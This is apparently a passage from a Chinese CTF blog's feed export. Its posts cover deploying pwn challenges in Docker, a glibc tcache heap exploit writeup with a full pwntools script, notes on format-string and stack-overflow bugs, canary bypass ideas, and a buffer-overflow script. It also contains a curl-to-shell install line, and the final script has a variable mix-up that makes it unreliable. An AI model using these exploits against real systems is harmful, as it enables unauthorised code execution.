    <content type="text"><![CDATA[本地搭建1socat tcp-l:6666,fork exec:./pwn,reuseaddr 测试1234$nc 0.0.0.0 6666lsflagpwn 也可以加个nohup，还可以再加个&amp;1nohup socat tcp-l:6666,fork exec:./pwn,reuseaddr 1nohup socat tcp-l:6666,fork exec:./pwn,reuseaddr&amp; 他们的作用分别是使用&amp;后台运行程序： 结果会输出到终端 使用Ctrl + C发送SIGINT信号，程序免疫 关闭session发送SIGHUP信号，程序关闭 使用nohup运行程序： 结果默认会输出到nohup.out 使用Ctrl + C发送SIGINT信号，程序关闭 关闭session发送SIGHUP信号，程序免疫 dockr搭建pwn题开源项目地址: https://github.com/Eadom/ctf_xinetd克隆下来之后，在当前目录下执行如下命令 建造镜像1docker build -t pwn-docker:16.04 . 若想搭建为18.04的环境，将dockerfile文件里面FROM ubuntu:16.04改为 FROM ubuntu:18.04123456789101112131415161718192021222324252627282930313233343536373839FROM ubuntu:16.04 #修改的地方RUN sed -i &quot;s/http:\/\/archive.ubuntu.com/http:\/\/mirrors.tuna.tsinghua.edu.cn/g&quot; /etc/apt/sources.list &amp;&amp; \ apt-get update &amp;&amp; apt-get -y dist-upgrade &amp;&amp; \ apt-get install -y lib32z1 xinetd &amp;&amp; apt-get install -y vimRUN useradd -m ctfWORKDIR /home/ctfRUN cp -R /lib* /home/ctf &amp;&amp; \ cp -R /usr/lib* /home/ctfRUN mkdir /home/ctf/dev &amp;&amp; \ mknod /home/ctf/dev/null c 1 3 &amp;&amp; \ mknod /home/ctf/dev/zero c 1 5 &amp;&amp; \ mknod /home/ctf/dev/random c 1 8 &amp;&amp; \ mknod /home/ctf/dev/urandom c 1 9 &amp;&amp; \ chmod 666 /home/ctf/dev/*RUN mkdir /home/ctf/bin &amp;&amp; \ cp /bin/sh /home/ctf/bin &amp;&amp; \ cp /bin/ls /home/ctf/bin &amp;&amp; \ cp /bin/cat /home/ctf/binCOPY ./ctf.xinetd /etc/xinetd.d/ctfCOPY ./start.sh /start.shRUN echo &quot;Blocked by ctf_xinetd&quot; &gt; /etc/banner_failRUN chmod +x /start.shCOPY ./bin/ /home/ctf/RUN chown -R root:ctf /home/ctf &amp;&amp; \ chmod -R 750 /home/ctf &amp;&amp; \ chmod 740 /home/ctf/flagCMD [&quot;/start.sh&quot;]EXPOSE 9999 然后创建容器，并做端口转发1docker run -p 0.0.0.0:9997:9999 pwn-docker:16.04 最后在物理机上访问9997端口,测试成功1234567891011$nc 0.0.0.0 9997lsbindevflagliblib32lib64pwncat flagctf&#123;please_initialize_this_flag&#125; 更换题目可用docker cp命令替换/home/ctf目录下的helloworld，并修改/etc/xinetd.d/ctf里面的题目名称1234567891011121314151617181920service ctf&#123; disable = no socket_type = stream protocol = tcp wait = no user = root type = UNLISTED port = 9999 bind = 0.0.0.0 server = /usr/sbin/chroot # replace helloworld to your program server_args = --userspec=1000:1000 /home/ctf ./helloworld #修改的地方 banner_fail = /etc/banner_fail # safety options per_source = 10 # the maximum instances of this service per source IP address rlimit_cpu = 20 # the maximum number of CPU seconds that the service may use #rlimit_as = 1024M # the Address Space resource limit for the service #access_times = 2:00-9:00 12:00-24:00&#125; 同时搭建多题开源项目地址： https://github.com/giantbranch/pwn_deploy_chroot 准备工作123456# 安装dockercurl -s https://get.docker.com/ | sh #已安装过的跳过# 安装 docker compose 和gitapt install docker-compose git# 下载git clone https://github.com/giantbranch/pwn_deploy_chroot.git 克隆下来之后，只需三步就可以搭建多道pwn题，并自动生成flag，获取到shell自动cat flag 将所有pwn题目放入bin目录（注意名字不带特殊字符，因为会将文件名作为linux用户名） python initialize.py docker-compose up –build -d 1234$python initialize.py &#123;"flag": "flag&#123;9c900d02-8567-4e16-8952-47a92d2dc06a&#125;", "port": 10000, "filename": "pwn1"&#125;&#123;"flag": "flag&#123;6f785f9e-fb19-4b54-9c6c-dd9b6f62041a&#125;", "port": 10001, "filename": "pwn1_copy1"&#125;&#123;"flag": "flag&#123;c65a3be4-a9d1-4122-b981-7a241ca73027&#125;", "port": 10002, "filename": "pwn1_copy2"&#125; 1docker-compose up --build -d 测试12$nc 0.0.0.0 10000pwn test 更换题目先把开启的容器删除掉，再执行上面三步即可。]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[数字经济 pwn amazon writeup]]></title>
    <url>%2F2019%2F09%2F25%2F%E6%95%B0%E5%AD%97%E7%BB%8F%E6%B5%8E%20pwn%20amazon%20writeup%2F</url>
    <content type="text"><![CDATA[思路1、利用glibc-2.27的tcache机制连续释放八次unsortedbin，再输出，可以leak出libc的基址2、利用unsortedbin的合并，overlap修改tcache表的fd位为_free_hook的地址3、提前把”$0\x00”(/bin/sh)写入到堆块中4、申请堆块到_free_hook附近，修改__free_hook为system,5、释放堆块，得到shell exp本地环境：ubuntu 18.04 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677#!/usr/bin/python2.7 # -*- coding: utf-8 -*-from pwn import *context.log_level = "debug"context.arch = "amd64"exe = './amazon'elf = ELF(exe)one = [0x4f2c5, 0x4f322, 0x10a38c]#------------------------------------def d(s = ''): gdb.attach(p ,s)def manu(idx): p.sendlineafter('choice: ', str(idx))def add(num, size, note): manu(1) p.sendlineafter('buy: ', str(1)) p.sendlineafter('many: ', str(num)) p.sendlineafter('note: ', str(size)) p.send(note)def add1(num, size, note): manu(1) p.sendlineafter('buy: ', str(1)) p.sendline(str(num)) p.sendline(str(size)) p.sendline(note)def show(): manu(2)def checkout(idx): manu(3) p.sendlineafter('for: ', str(idx))def pwn(): add(2, 0x80, 'a') #0 add(2, 0xa0, 'A') #1 add(2, 0x90, 'A') #2 add(2, 0x10, 'A') #3 for i in range(8): checkout(0) for i in range(8): checkout(2) show() p.recvuntil('Name: ') libc.address = u64(p.recv(6).ljust(8, '\x00')) - 0x3ebca0 success('libc.address---&gt;'+hex(libc.address)) for i in range(8): checkout(1) add(2, 0x100, '\xff'*0x80 +p64(3)+p64(0xa1) + p64(libc.sym['__free_hook']-0x40)) #0 1 checkout(0) add(2, 0xa0, 'a'*0x8)#4 add(2, 0x100, '\x99'*0x80 +p64(3)+p64(0xa1) + '$0\x00') #5 add(2, 0xa0, '\x00'*0x20+p64(libc.sym['system'])) #d() checkout(5) p.interactive()#-------------------------------------if __name__ == '__main__': l = 1 if l: p = process(exe) libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: p = remote('121.41.38.38', 9999) libc = ELF('libc-2.27.so') pwn() 参考文章：https://firmianay.gitbooks.io/ctf-all-in-one/doc/4.14_glibc_tcache.htmlhttps://mp.weixin.qq.com/s/Q4A6LwCd2E29uSXjMJs1dg]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[linux c alarm函数]]></title>
    <url>%2F2019%2F09%2F11%2Flinux-c-alarm%E5%87%BD%E6%95%B0%2F</url>
    <content type="text"><![CDATA[alarmalarm称为闹钟函数，alarm()用来设置信号SIGALRM在经过参数seconds指定的秒数后传送给目前的进程。如果参数seconds为0，则之前设置的闹钟会被取消，并将剩下的时间返回。要注意的是，一个进程只能有一个闹钟时间，如果在调用alarm之前已设置过闹钟时间，则任何以前的闹钟时间都被新值所代替。 所需头文件 1#include &lt;unistd.h&gt; 函数原型1unsigned int alarm（unsigned int seconds) 函数参数 seconds:指定秒数函数返回值 成功：如果调用此alarm（）前，进程已经设置了闹钟时间，则返回上一个闹钟时间的剩余时间，否则返回0。 出错：-1 示例1234567891011121314151617181920212223#include&lt;unistd.h&gt;#include&lt;signal.h&gt;void handler()&#123; printf("Hello\n"); signal(SIGALRM, handler); //让内核做好准备，一旦接受到SIGALARM信号,就执行 handler alarm(5);&#125; void main()&#123; int i; handler(); for(i=1;i&lt;21;i++) &#123; printf("sleep %d ...\n",i); sleep(1); &#125;&#125; 结果：刚开始在main中执行一次，然后每隔5秒执行一次handler()12345678910111213141516171819202122232425Hellosleep 1 ...sleep 2 ...sleep 3 ...sleep 4 ...sleep 5 ...Hellosleep 6 ...sleep 7 ...sleep 8 ...sleep 9 ...sleep 10 ...Hellosleep 11 ...sleep 12 ...sleep 13 ...sleep 14 ...sleep 15 ...Hellosleep 16 ...sleep 17 ...sleep 18 ...sleep 19 ...sleep 20 ...Hello 注意：alarm只设定一个闹钟，时间到达并执行其注册函数之后，闹钟便失效。如果想循环设置闹钟，需在其注册函数中在调用alarm函数。]]></content>
      <categories>
        <category>c</category>
      </categories>
      <tags>
        <tag>c</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[格式化字符串漏洞]]></title>
    <url>%2F2018%2F11%2F29%2F%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[0x00 什么是格式化字符串学过c语言的都知道printf，fprintf，sprintf等这一类printf函数中经常用到”%”，后面加一个或多个字符串做说明符。格式化字符串指的就是printf函数第一个参数，最常见的包括：123456%d - 十进制 - 输出十进制整数%s - 字符串 - 从内存中读取字符串%x - 十六进制 - 输出十六进制数%c - 字符 - 输出字符%p - 指针 - 指针地址%n - 到目前为止所写的字符数 printf有一个特殊的格式化控制符%n，和其他控制输出格式和内容的格式化字符不同的是，这个格式化字符会将已输出的字符数写入到对应参数的内存中。我们就利用这个漏洞实现任意地址写 0x01 漏洞原理产生漏洞的原因就是没写格式化控制符,如123char str[100];scanf(&quot;%s&quot;,str);printf(str); 事实上，这是一种非常危险的写法。由于printf函数族的设计缺陷，当其第一个参数可被控制时，攻击者将有机会对任意内存地址进行读写操作。 一般来说，每个函数的参数个数都是固定的，被调用的函数知道应该从内存中读取多少个变量，但printf是可变参数的函数，对可变参数的函数而言，一切就变得模糊了起来。函数的调用者可以自由的指定函数参数的数量和类型，被调用者无法知道在函数调用之前到底有多少参数被压入栈帧当中。所以printf函数要求传入一个format参数用以指定到底有多少，怎么样的参数被传入其中。然后它就会忠实的按照函数的调用者传入的格式一个一个的打印出数据。由于编程者的疏忽，把格式化字符串的操纵权交给用户，就会产生后面任意地址读写的漏洞。 举个栗子，主函数如下：程序很简单，可以多次输入方便调试，memset函数先把buf都初始化为0，然后read函数读取键盘操作，输入buf最后在输出buf。 正常情况下我们输入什么都会输出什么，但是当我们输入一些特定的字符时输出出现了变化。 0x02利用格式化字符串漏洞实现任意地址读]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[从非缓冲系统文件到常见栈溢出函数]]></title>
    <url>%2F2018%2F11%2F12%2F%E4%BB%8E%E9%9D%9E%E7%BC%93%E5%86%B2%E7%B3%BB%E7%BB%9F%E6%96%87%E4%BB%B6%E5%88%B0%E5%B8%B8%E8%A7%81%E6%A0%88%E6%BA%A2%E5%87%BA%E5%87%BD%E6%95%B0%2F</url>
    <content type="text"><![CDATA[非缓冲和缓冲是相对而言的了解什么是非缓冲文件系统之前，先了解一下缓冲文件系统。 什么是缓冲文件系统？程序在运行过程中，会自动在内存开辟一个“缓冲区”，为程序中的每一个文件使用，当执行读文件的操作时，从磁盘文件将数据先读入内存“缓冲区”，装满后再从内存“缓冲区”依此读入接收的变量。执行写文件的操作时，先将数据写入内存“缓冲区”，待内存“缓冲区”装满后再写入文件。由此可以看出，内存“缓冲区”的大小，影响着实际操作外存的次数，内存“缓冲区”越大，则操作外存的次数就少，执行速度就快、效率高。一般来说，文件“缓冲区”的大小随机器而定。 作用用缓冲区可以一次读入一批数据，或输出一批数据，而不是执行一次输入或输出函数就去访问一次磁盘，这样做的目的是减少对磁盘的实际读写次数。 代表函数(c语言)缓冲文件系统，fopen, fclose, fread, fwrite, fgetc, fgets, fputc, fputs, freopen, fseek, ftell, rewind等 非缓冲文件系统特点非缓冲文件系统不由系统自动设置缓冲区，而由用户自己根据需要设置。在传统的unix系统下，用缓冲文件系统来处理文本文件，用非缓冲文件系统处理二进制文件。 代表函数缓冲文件系统，open, close, read, write, gets, getchar, putc, putchar等 栈溢出常见函数 函数 功能 可利用漏洞 read() 读取文件内容到缓冲区 读到\x00和指定字节 write() 把缓冲区的内容写入到文件内 写到\x00和指定字节 gets() 从输入缓冲区中读取一个字符串存储到字符指针 可无限输入 puts() 输出字符串,相当于printf(“%s\n”,s) 输出直到\x00 strcpy() 只能复制字符串 一直复制直到遇到\x00 memcpy() 复制任意内容 指定字节 strncpy() 复制指定字节字符 指定字节 printf() 格式化输出 输出直到\x00 scanf() 格式化输入 输入与定义不同的类型或输入多与定义的数组元素 下面是详细内容: 0x00 read()函数原型12#include &lt;unistd.h&gt;ssize_t read (int fd, void *buf, size_t nbyte) fd：文件描述符；fd为0从键盘读取buf：指定的缓冲区，即指针，指向一段内存单元；nbyte：要读入文件指定的字节数； 功能read()会把参数fd所指的文件传送nbyte个字节到buf指针所指的内存中。若参数nbyte为0，则read()不会有作用并返回0。 返回值成功时,read返回实际所读的字节数,如果返回的值是0,表示已经读到文件的结束了.小于0表示出现了错误.如果错误为EINTR说明读是由中断引起的, 如果是ECONNREST表示网络连接出了问题. 0x01 write()函数原型12#include &lt;unistd.h&gt;ssize_t write(int fd,const void *buf,size_t nbytes) fd：文件描述符；fd为1输出到显示器buf：指定的缓冲区，即指针，指向一段内存单元；nbyte：要写入文件指定的字节数； 功能write()会把参数buf 所指的内存写入nbytes 个字节到参数fd 所指的文件内. 当然, 文件读写位置也会随之移动. 返回值如果顺利write()会返回实际写入的字节数.当有错误发生时则返回-1, 错误代码存入errno 中. 错误代码： EINTR 此调用被信号所中断. EAGAIN 当使用不可阻断I/O 时 (O_NONBLOCK), 若无数据可读取则返回此值. EADF 参数fd 非有效的文件描述词, 或该文件已关闭 0x02 gets()函数原型12# include &lt;stdio.h&gt;char *gets(char *str); 功能gets() 函数的功能是从输入缓冲区中读取一个字符串存储到字符指针变量 str 所指向的内存空间。 注意使用 gets() 时，系统会将最后“敲”的换行符从缓冲区中取出来，然后丢弃，所以缓冲区中不会遗留换行符。这就意味着，如果前面使用过 gets()，而后面又要从键盘给字符变量赋值的话就不需要吸收回车清空缓冲区了，因为缓冲区的回车已经被 gets() 取出来扔掉了 gets() 时有空格也可以直接输入，但是 gets() 有一个非常大的缺陷，即它不检查预留存储区是否能够容纳实际输入的数据，换句话说，如果输入的字符数目大于数组的长度，gets 无法检测到这个问题，就会发生内存越界。 0x03 strcpy()和memcpy()和strncpy()函数原型123char* strcpy(char* dest, const char* src)void *memcpy( void *dest, const void *src, size_t count );char *strncpy(char *dest,char *src,int size_t n); dest:指向用于存储复制内容的目标数组。src:要复制的字符串。count：要读入文件指定的字节数； 注意 strcpy提供了字符串的复制。即strcpy只用于字符串复制，并且它不仅复制字符串内容之外，还会复制字符串的结束符’\0’。 复制的内容不同。strcpy只能复制字符串，而memcpy可以复制任意内容，例如字符数组、整型、结构体、类等。 复制的方法不同。strcpy不需要指定长度，它遇到被复制字符的串结束符”\0”才结束，所以容易溢出。memcpy则是根据其第3个参数决定复制的长度。 用途不同。通常在复制字符串时用strcpy，而需要复制其他类型数据时则一般用memcpy strncpy函数，只是将src的前n个字符复制到dest的前n个字符，不自动添加’\0’。如果src的长度小于n个字节，则以NULL填充dest直到复制完n个字节 0x04 printf()和scanf()引入：华为的一道经典面试 i的值输出是多少呢，没有考虑栈溢出的话，i就是5。可这里栈溢出了，i=6776421 ，这是为什么呢？进入到内存中分析：连续定义的变量，内存地址一般也相邻首先依次在栈区为变量开辟空间（注意方式，整形是4个字节以计算，char型一字节一计算）a,b,c,d,e对应的ASCII码对照表的16进制为0x61,0x62,0x63,0x64,0x65 越界后： 所以最后的结果是0x676665的十进制6776421]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[open、fopen和popen]]></title>
    <url>%2F2018%2F11%2F07%2Fopen%E3%80%81fopen%E5%92%8Cpopen%2F</url>
    <content type="text"><![CDATA[open简介打开设备文件不带缓冲区非缓冲文件系统依赖于操作系统，通过操作系统的功能对文件进行读写，是系统级的输入输出，它不设文件结构体指针，只能读写二进制文件，但效率高、速度 快 函数原型1234567int open(const char *pathname, int flags);int open(const char *pathname, int flags, mode_t mode);所需库：#include &lt;sys/types.h&gt; #include &lt;sys/stat.h&gt; #include &lt;fcntl.h&gt; 返回值成功则返回文件描述符，否则返回 -1; 参数说明参数 pathname 指向欲打开的文件路径字符串. 下列是参数flags 所能使用的旗标: O_RDONLY 以只读方式打开文件 O_WRONLY 以只写方式打开文件 O _RDWR 以可读写方式打开文件. 上述三种旗标是互斥的, 也就是不可同时使用, 但可与下列的旗标利用OR(|)运算符组合. O_CREAT 若欲打开的文件不存在则自动建立该文件. O_EXCL 如果O_CREAT 也被设置, 此指令会去检查文件是否存在. 文件若不存在则建立该文件, 否则将导致打开文件错误. 此外, 若O_CREAT 与O_EXCL 同时设置, 并且欲打开的文件为符号连接, 则会打开文件失败. O_NOCTTY 如果欲打开的文件为终端机设备时, 则不会将该终端机当成进程控制终端机. O_TRUNC 若文件存在并且以可写的方式打开时, 此旗标会令文件长度清为0, 而原来存于该文件的资料也会消失. O_APPEND 当读写文件时会从文件尾开始移动, 也就是所写入的数据会以附加的方式加入到文件后面. O_NONBLOCK 以不可阻断的方式打开文件, 也就是无论有无数据读取或等待, 都会立即返回进程之中. O_NDELAY 同O_NONBLOCK. O_SYNC 以同步的方式打开文件. O_NOFOLLOW 如果参数pathname 所指的文件为一符号连接, 则会令打开文件失败. O_DIRECTORY 如果参数pathname 所指的文件并非为一目录, 则会令打开文件失败。注：此为Linux2. 2 以后特有的旗标, 以避免一些系统安全问题. 参数mode 则有下列数种组合, 只有在建立新文件时才会生效, 此外真正建文件时的权限会受到umask 值所影响, 因此该文件权限应该为 (mode-umaks). S_IRWXU00700 权限, 代表该文件所有者具有可读、可写及可执行的权限. S_IRUSR 或S_IREAD, 00400 权限, 代表该文件所有者具有可读取的权限. S_IWUSR 或S_IWRITE, 00200 权限, 代表该文件所有者具有可写入的权限. S_IXUSR 或S_IEXEC, 00100 权限, 代表该文件所有者具有可执行的权限. S_IRWXG 00070 权限, 代表该文件用户组具有可读、可写及可执行的权限. S_IRGRP 00040 权限, 代表该文件用户组具有可读的权限. S_IWGRP 00020 权限, 代表该文件用户组具有可写入的权限. S_IXGRP 00010 权限, 代表该文件用户组具有可执行的权限. S_IRWXO 00007 权限, 代表其他用户具有可读、可写及可执行的权限. S_IROTH 00004 权限, 代表其他用户具有可读的权限 S_IWOTH 00002 权限, 代表其他用户具有可写入的权限. S_IXOTH 00001 权限, 代表其他用户具有可执行的权限. 返回值：若所有欲核查的权限都通过了检查则返回0 值, 表示成功, 只要有一个权限被禁止则返回-1. 错误代码： EEXIST 参数pathname 所指的文件已存在, 却使用了O_CREAT 和-O_EXCL 旗标. EACCESS 参数pathname 所指的文件不符合所要求测试的权限. EROFS 欲测试写入权限的文件存在于只读文件系统内. EFAULT 参数pathname 指针超出可存取内存空间. EINVAL 参数mode 不正确. ENAMETOOLONG 参数 pathname 太长. ENOTDIR 参数pathname 不是目录. ENOMEM 核心内存不足. ELOOP 参数pathname 有过多符号连接问题. EIO I/O 存取错误. fopen简介打开普通文件带缓冲区缓冲文件系统是借助文件结构体指针来对文件进行管理，通过文件指针来对文件进行访问，既可以读写字符、字符串、格式化数据，也可以读写二进制数据。 函数原型12#include&lt;stdio.h&gt;FILE * fopen(const char * path,const char * mode); 返回值文件顺利打开后，指向该流的文件指针就会被返回。如果文件打开失败则返回NULL，并把错误代码存在errno 中。 参数说明参数path字符串包含欲打开的文件路径及文件名，参数mode字符串则代表着流形态。mode有下列几种形态字符串:r 以只读方式打开文件，该文件必须存在。r+ 以可读写方式打开文件，该文件必须存在。rb+ 读写打开一个二进制文件，允许读写数据。rw+ 读写打开一个文本文件，允许读和写。w 打开只写文件，若文件存在则文件长度清为0，即该文件内容会消失。若文件不存在则建立该文件。w+ 打开可读写文件，若文件存在则文件长度清为零，即该文件内容会消失。若文件不存在则建立该文件。a 以附加的方式打开只写文件。若文件不存在，则会建立该文件，如果文件存在，写入的数据会被加到文件尾，即文件原先的内容会被保留。（EOF符保留）a+ 以附加方式打开可读写的文件。若文件不存在，则会建立该文件，如果文件存在，写入的数据会被加到文件尾后，即文件原先的内容会被保留。 （原来的EOF符不保留）wb 只写打开或新建一个二进制文件；只允许写数据。wb+ 读写打开或建立一个二进制文件，允许读和写。ab+ 读写打开一个二进制文件，允许读或在文件末追加数据。at+ 打开一个叫string的文件，a表示append,就是说写入处理的时候是接着原来文件已有内容写入，不是从头写入覆盖掉，t表示打开文件的类型是文本文件，+号表示对文件既可以读也可以写。上述的形态字符串都可以再加一个b字符，如rb、w+b或ab+等组合，加入b 字符用来告诉函数库以二进制模式打开文件。如果不加b，表示默认加了t，即rt,wt,其中t表示以文本模式打开文件。由fopen()所建立的新文件会具有S_IRUSR|S_IWUSR|S_IRGRP|S_IWGRP|S_IROTH|S_IWOTH(0666)权限，此文件权限也会参考umask 值。有些C编译系统可能不完全提供所有这些功能，有的C版本不用”r+”,”w+”,”a+”,而用”rw”,”wr”,”ar”等，读者注意所用系统的规定。 popen函数原型12#include&lt;stdio.h&gt;FILE * popen ( const char * command , const char * type ); 返回值如果调用 fork() 或 pipe() 失败，或者不能分配内存将返回NULL，否则返回标准 I/O 流。 参数说明type 参数只能是读或者写中的一种，得到的返回值（标准 I/O 流）也具有和 type 相应的只读或只写类型。如果 type 是 “r” 则文件指针连接到 command 的标准输出；如果 type 是 “w” 则文件指针连接到 command 的标准输入。command 参数是一个指向以 NULL 结束的 shell 命令字符串的指针。这行命令将被传到 bin/sh 并使用-c 标志，shell 将执行这个命令。]]></content>
      <categories>
        <category>c</category>
      </categories>
      <tags>
        <tag>c</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[缓冲文件系统和非缓冲文件系统]]></title>
    <url>%2F2018%2F11%2F05%2F%E7%BC%93%E5%86%B2%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%92%8C%E9%9D%9E%E7%BC%93%E5%86%B2%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%2F</url>
    <content type="text"><![CDATA[前言1983 年ANSI C 标准决定不采用非缓冲文件系统，而只采用缓冲文件系统。即用缓冲文件系统处理文本文件，也用它来处理二进制文件。也就是将缓冲文件系统扩充为可以处理二进制文件。 缓冲文件系统特点自动在内存开辟一个“缓冲区”，为程序中的每一个文件使用，当执行读文件的操作时，从磁盘文件将数据先读入内存“缓冲区”，装满后再从内存“缓冲区”依此读入接收的变量。执行写文件的操作时，先将数据写入内存“缓冲区”，待内存“缓冲区”装满后再写入文件。由此可以看出，内存“缓冲区”的大小，影响着实际操作外存的次数，内存“缓冲区”越大，则操作外存的次数就少，执行速度就快、效率高。一般来说，文件“缓冲区”的大小随机器而定。 作用用缓冲区可以一次读入一批数据，或输出一批数据，而不是执行一次输入或输出函数就去访问一次磁盘，这样做的目的是减少对磁盘的实际读写次数。 代表函数缓冲文件系统，fopen, fclose, fread, fwrite, fgetc, fgets, fputc, fputs, freopen, fseek, ftell, rewind等 非缓冲文件系统特点非缓冲文件系统不由系统自动设置缓冲区，而由用户自己根据需要设置。在传统的unix系统下，用缓冲文件系统来处理文本文件，用非缓冲文件系统处理二进制文件。 代表函数缓冲文件系统，open, close, read, write, gets, getchar, putc, putchar等]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[栈溢出常见函数]]></title>
    <url>%2F2018%2F11%2F04%2F%E6%A0%88%E6%BA%A2%E5%87%BA%E5%B8%B8%E8%A7%81%E5%87%BD%E6%95%B0%2F</url>
    <content type="text"><![CDATA[0x00 read()函数原型12#include &lt;unistd.h&gt;ssize_t read (int fd, void *buf, size_t nbyte) fd：文件描述符；fd为0从键盘读取buf：指定的缓冲区，即指针，指向一段内存单元；nbyte：要读入文件指定的字节数； 功能read()会把参数fd所指的文件传送nbyte个字节到buf指针所指的内存中。若参数nbyte为0，则read()不会有作用并返回0。 返回值成功时,read返回实际所读的字节数,如果返回的值是0,表示已经读到文件的结束了.小于0表示出现了错误.如果错误为EINTR说明读是由中断引起的, 如果是ECONNREST表示网络连接出了问题. 0x01 write()函数原型12#include &lt;unistd.h&gt;ssize_t write(int fd,const void *buf,size_t nbytes) fd：文件描述符；fd为1输出到显示器buf：指定的缓冲区，即指针，指向一段内存单元；nbyte：要写入文件指定的字节数； 功能write()会把参数buf 所指的内存写入nbytes 个字节到参数fd 所指的文件内. 当然, 文件读写位置也会随之移动. 返回值如果顺利write()会返回实际写入的字节数.当有错误发生时则返回-1, 错误代码存入errno 中. 错误代码： EINTR 此调用被信号所中断. EAGAIN 当使用不可阻断I/O 时 (O_NONBLOCK), 若无数据可读取则返回此值. EADF 参数fd 非有效的文件描述词, 或该文件已关闭 0x02 gets()函数原型12# include &lt;stdio.h&gt;char *gets(char *str); 功能gets() 函数的功能是从输入缓冲区中读取一个字符串存储到字符指针变量 str 所指向的内存空间。 注意使用 gets() 时，系统会将最后“敲”的换行符从缓冲区中取出来，然后丢弃，所以缓冲区中不会遗留换行符。这就意味着，如果前面使用过 gets()，而后面又要从键盘给字符变量赋值的话就不需要吸收回车清空缓冲区了，因为缓冲区的回车已经被 gets() 取出来扔掉了 gets() 时有空格也可以直接输入，但是 gets() 有一个非常大的缺陷，即它不检查预留存储区是否能够容纳实际输入的数据，换句话说，如果输入的字符数目大于数组的长度，gets 无法检测到这个问题，就会发生内存越界。 0x03 strcpy()和memcpy()和strncpy()函数原型123char* strcpy(char* dest, const char* src)void *memcpy( void *dest, const void *src, size_t count );char *strncpy(char *dest,char *src,int size_t n); dest:指向用于存储复制内容的目标数组。src:要复制的字符串。count：要读入文件指定的字节数； 注意 strcpy提供了字符串的复制。即strcpy只用于字符串复制，并且它不仅复制字符串内容之外，还会复制字符串的结束符’\0’。 复制的内容不同。strcpy只能复制字符串，而memcpy可以复制任意内容，例如字符数组、整型、结构体、类等。 复制的方法不同。strcpy不需要指定长度，它遇到被复制字符的串结束符”\0”才结束，所以容易溢出。memcpy则是根据其第3个参数决定复制的长度。 用途不同。通常在复制字符串时用strcpy，而需要复制其他类型数据时则一般用memcpy strncpy函数，只是将src的前n个字符复制到dest的前n个字符，不自动添加’\0’。如果src的长度小于n个字节，则以NULL填充dest直到复制完n个字节 0x04 printf()和scanf()scanf函数scanf(“%d %d”,&amp;a,&amp;b);遇到空格(0x20)停止读取 printf函数printf(“%s”, i);输出直到\x00 格式化字符串漏洞通常来说，我们会使用printf([格式化字符串]，参数)的形式来进行调用，例如12char s[20] = “Hello world!\n”;printf(“%s”, s); 然而，有时候为了省事也会写成12char s[20] = “Hello world!\n”;printf(s); 事实上，这是一种非常危险的写法。由于printf函数族的设计缺陷，当其第一个参数可被控制时，攻击者将有机会对任意内存地址进行读写操作。]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[stack canary绕过思路]]></title>
    <url>%2F2018%2F10%2F24%2Fstack-canary%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF%2F</url>
    <content type="text"><![CDATA[0x00 canary保护机制我们知道，通常栈溢出的利用方式是通过溢出存在于栈上的局部变量，从而让多出来的数据覆盖ebp、eip等，从而达到劫持控制流的目的。然而stack canary这一技术的应用使得这种利用手段变得难以实现。 canary保护机制是在栈保护上则是在初始化一个栈帧时在栈底设置一个随机的canary值（最后两位必须是00），栈帧销毁前测试该值是否“死掉”，即是否被改变，若被改变则说明栈溢出发生，程序走另一个流程结束，以免漏洞利用成功。 如图var-c就是canary的地址，如果触发了栈溢出漏洞，还不知道canary的值，就会执行__stack_chk_fail函数。 0x01 泄露canary泄露canary的方法有： 通过格式化字符串漏洞来泄露canary的值 通过栈溢出漏洞来泄露canary的值 多进程程序的canary爆破 利用__stack_chk_fail函数泄露信息当然具体问题还要具体分析 未完待续。。。]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[oj level0和level1总结]]></title>
    <url>%2F2018%2F09%2F21%2Foj-level0%E5%92%8Clevel1%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[做题之前，需要知道pwntools的基本用法，如下：123456789from pwn import *context(arch = &apos;i386&apos;, os = &apos;linux&apos;) ;设置目标机的信息r = remote(&apos;exploitme.example.com&apos;, 31337) ;用来建立一个远程连接，url或者ip作为地址 然后指明端口,这里也可以仅仅使用本地文件,调试时方便:r.send(asm(shellcraft.sh())) ;r.send()将shellcode发送到远程连接r.interactive() ;将控制权交给用户，这样就可以使用打开的shell了 ps：具体的可以看我的另一篇博客 还需要知道pwn的一般套路，这里我只说说栈溢出的基本套路： 找到栈溢出地址（就是搞事情的地址），基本上都是buf的地址，这个地址需要用pwntools中的p32或p64进行转换，（若程序是32位的就用p32）才能用pwntools中的sendline发送到远程连接 构建shellcode，用一句话就行shellcode = asm(shellcraft.sh()) 构建payload，payload的基本构建：payload=shellcode+’a’*一个长度+p32(buf_addr)，次序一定不能乱 最后就可以发送payload，进行交互，得到shell的控制权，然后ls ，cat flag level0的脚本如下：1234567from pwn import *s_addr=0x400596r=remote(&quot;pwn2.jarvisoj.com&quot;,9881)p.sendline(&apos;a&apos;*0x80+&apos;a&apos;*8+p64(s_addr))p.interactive() 